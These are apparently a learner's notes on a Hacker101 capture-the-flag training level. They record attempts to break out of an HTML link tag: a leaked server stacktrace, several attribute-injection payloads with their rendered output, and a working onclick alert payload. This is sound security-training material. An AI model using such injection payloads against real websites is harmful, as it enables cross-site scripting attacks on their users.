# Hacker101Levels

## [Breakerbank](https://www.hacker101.com/coursework/level0)  

[7/21/2018]: Stacktrace of first POST request with payload ```hola.com">```:

```python
Traceback (most recent call last):
  File "/base/alloc/tmpfs/dynamic_runtimes/python27/b93f87cfaa0115e5_unzipped/python27_lib/versions/third_party/webapp2-2.5.2/webapp2.py", line 1535, in __call__
    rv = self.handle_exception(request, response, e)
  File "/base/alloc/tmpfs/dynamic_runtimes/python27/b93f87cfaa0115e5_unzipped/python27_lib/versions/third_party/webapp2-2.5.2/webapp2.py", line 1529, in __call__
    rv = self.router.dispatch(request, response)
  File "/base/alloc/tmpfs/dynamic_runtimes/python27/b93f87cfaa0115e5_unzipped/python27_lib/versions/third_party/webapp2-2.5.2/webapp2.py", line 1278, in default_dispatcher
    return route.handler_adapter(request, response)
  File "/base/alloc/tmpfs/dynamic_runtimes/python27/b93f87cfaa0115e5_unzipped/python27_lib/versions/third_party/webapp2-2.5.2/webapp2.py", line 1102, in __call__
    return handler.dispatch()
  File "/base/alloc/tmpfs/dynamic_runtimes/python27/b93f87cfaa0115e5_unzipped/python27_lib/versions/third_party/webapp2-2.5.2/webapp2.py", line 572, in dispatch
    return self.handle_exception(e, self.app.debug)
  File "/base/alloc/tmpfs/dynamic_runtimes/python27/b93f87cfaa0115e5_unzipped/python27_lib/versions/third_party/webapp2-2.5.2/webapp2.py", line 570, in dispatch
    return method(*args, **kwargs)
  File "/base/data/home/apps/p~h101levels/20180202t110729.407376272389227651/level1.py", line 37, in get
    self.render_response('level1/post.html', post=Post.all().order('date')[int(id)])
ValueError: invalid literal for int() with base 10: ''
```

[7/21/2018]: Message when POSTing ```hola que tal http://hola.com">```

```So, you can't break out of the <a> tag. But what can you do inside the tag?```

[7/21/2018]:

__Payload__: ```http://.com"</a>```

_Rendered_: 
```html
<a href="http://.com" &lt;="" a&gt;"="">http://.com"&lt;/a&gt;</a>
```

__Payload__: ```http://.com"name```

_Rendered_:
```html
<a href="http://.com" name"="">http://.com"name</a>
```

__Payload__: ```http://.com"name=```

_Rendered_:
```html
<a href="http://.com" name=">http://.com"></a>
Not visible on screen for some reason
```

__Payload__: ```http://.com"name="">```

Same message.

_Rendered_:
```html
<a href="http://.com" name="" &gt;"="">http://.com"name=""&gt;</a>
```

_'>'_ character keeps getting filtered and being decoded into ```$gt;```.   
```name``` property passed through tho, with an empty value.

__Payload__: ```http://.com"href="">```

_Rendered_:
```html
<a href="http://.com" "="">http://.com"href=""</a>
```

```href``` property gets filtered too.

[7/21/2018]: We got a winner

__Payload__: ```http://google.com"onclick="alert(1)"```

Showed the alert.

